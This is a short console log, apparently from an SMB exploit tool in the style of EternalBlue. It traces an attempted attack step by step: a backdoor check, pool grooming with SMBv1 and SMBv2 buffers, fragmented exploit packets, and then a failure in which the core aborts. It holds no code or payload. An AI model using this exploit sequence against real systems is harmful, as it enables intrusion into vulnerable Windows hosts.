[*] Connecting to target for exploitation.
    [+] Connection established for exploitation.
[*] Pinging backdoor...
    [+] Backdoor not installed, game on.
[*] Building exploit buffer
[*] Sending all but last fragment of exploit packet
    ................DONE.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Starting non-paged pool grooming
    [+] Sending SMBv2 buffers
        .............DONE.
    [+] Sending large SMBv1 buffer..DONE.
    [+] Sending final SMBv2 buffers......DONE.
    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] Sending SMB Echo request
[*] Good reply from SMB Echo request
[*] Sending last fragment of exploit packet!
    DONE.
[*] Receiving response from exploit packet
[-] No response received from exploit packet. Not good.
[+] CORE terminated with status code 0xdf5d0013
[-] Error getting output back from Core; aborting...
[*] Core thread exit code: 0x00000000
[*] Proxy thread exit code:   0x00000000
